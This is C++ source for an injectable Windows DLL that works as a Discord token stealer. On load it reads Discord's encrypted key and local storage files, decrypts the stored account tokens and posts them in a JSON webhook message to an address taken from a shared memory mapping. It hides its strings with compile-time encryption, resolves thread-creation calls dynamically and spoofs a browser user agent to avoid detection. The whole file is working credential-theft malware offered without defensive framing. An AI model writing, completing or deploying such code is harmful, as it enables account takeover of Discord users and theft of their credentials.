#include "framework.h"

typedef HANDLE(WINAPI* CreateThreadCustom)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, __drv_aliasesMem LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* CreateProcessCustom)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);

std::vector<std::string> tokens = {};

void Thread(void* data);

void Entry(HMODULE hModule) {
	CreateThreadCustom CreateThreadA = (CreateThreadCustom)GetProcAddress(GetModuleHandleA(skCrypt("kernel32.dll")), skCrypt("CreateThread"));
	CreateProcessCustom CreateProcessA = (CreateProcessCustom)GetProcAddress(GetModuleHandleA(skCrypt("kernel32.dll")), skCrypt("CreateProcessA"));

    //void* hook = base + 0x4000;

	PWSTR szAppdata;
	SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, nullptr, &szAppdata);
	CoTaskMemFree(szAppdata);

	std::wstring szKeyFile(szAppdata);
	szKeyFile.append(skCrypt(L"/Discord/Local State"));

	std::wstring szDatabaseDir(szAppdata);
	szDatabaseDir.append(skCrypt(L"/Discord/Local Storage/leveldb/"));

	if (!std::filesystem::exists(szKeyFile)) {
		std::cout << skCrypt("Couldn't find Local State in discord directory") << std::endl;
		return;
	}

	std::ifstream localState(szKeyFile);
	std::string keyFile;

	std::string text;
	while (std::getline(localState, text)) {
		keyFile.append(text);
	}

	localState.close();


	keyFile = keyFile.substr(keyFile.find(skCrypt("encrypted_key")) + 16);
	keyFile = keyFile.substr(0, keyFile.find("\""));

	std::vector<HANDLE> threads = {};
	for (const auto& entry : std::filesystem::directory_iterator(szDatabaseDir)) {
		if (entry.is_regular_file()) {
			std::filesystem::path file = entry.path();

			if (!file.extension().filename().string().compare(skCrypt(".ldb"))) {
				std::string s = file.string();

				HANDLE hThread = CreateThreadA(nullptr, 0, (LPTHREAD_START_ROUTINE)Thread, static_cast<void*>(&s), 0, nullptr);
				threads.push_back(hThread);
				Sleep(25);
			}
		}

	}

	for (auto& thread : threads) {
		WaitForSingleObject(thread, INFINITE);
	}
	threads.clear();

	std::string body(skCrypt(R"({
	  "content": "@here",
	  "embeds": [
		{
		  "title": "Tokens fetched:",
		  "color": null,
		  "fields": [
	)"));

	bcrypt::init();

	int i = 0;
	for (auto& str : tokens) {
		str = str.substr(12); // The encrypted token after "dQw4w9WgXcQ:"

		std::vector<BYTE> encryptedKey = base64::Decode(keyFile);
		std::vector<BYTE> test = { encryptedKey.begin() + 5, encryptedKey.end() };
		std::vector<BYTE> decryptedKey = crypter::Unprotect(test);

		std::vector<BYTE> token = base64::Decode(str);
		std::vector<BYTE> nonsense(token.begin() + 3, token.begin() + 15);
		std::vector<BYTE> text(token.begin() + 15, token.end() - 16);
		std::vector<BYTE> tag(token.end() - 16, token.end());

		std::string decrypted = crypter::Decrypt(decryptedKey, nonsense, text, tag);
		//std::cout << "Decrypted Token: " << decrypted << std::endl;

		body.append(skCrypt(R"({"name":"token:", "value":")"));
		body.append(decrypted);
		body.append(R"("})");

		if (i != tokens.size() - 1) {
			body.append(",");
		}
		i++;
	}

	body.append(skCrypt(R"(]
		}
	  ],
	  "attachments": []
	})"));


	HANDLE hMap = OpenFileMappingA(FILE_MAP_ALL_ACCESS, FALSE, skCrypt("Local\\Microsoft"));
	if (!hMap) {
		std::cerr << "OpenFileMapping failed: " << GetLastError() << std::endl;
		return;
	}

	char* webhook = (char*)MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, 1024);

	std::map<std::string, std::string> headers = {
		{skCrypt("Content-Type").decrypt(), skCrypt("application/json").decrypt()},
		{skCrypt("User-Agent").decrypt(), skCrypt("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0").decrypt()},
	};

	Request* req = new Request(webhook, headers, body);
	req->Post();

	UnmapViewOfFile(webhook);
	CloseHandle(hMap);

	Sleep(1000);
	FreeLibraryAndExitThread(hModule, 0);
	return;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)Entry, hModule, 0, nullptr);
        break;
	case DLL_PROCESS_DETACH:

		break;
    }
    return TRUE;
}

void Thread(void* data) {
	std::string& s = *(static_cast<std::string*>(data));

	std::ifstream file(s, std::ios::binary);
	if (!file) {
		std::cerr << skCrypt("Failed to open file: ") << s << std::endl;
		return;
	}

	std::ostringstream buffer;
	buffer << file.rdbuf();
	std::string keyFile = buffer.str();

	std::regex pattern(skCrypt(R"(dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\""]*)"));
	std::smatch match;

	if (std::regex_search(keyFile, match, pattern)) {
		for (auto& m : match) {
			tokens.push_back(m);
		}
	}
}
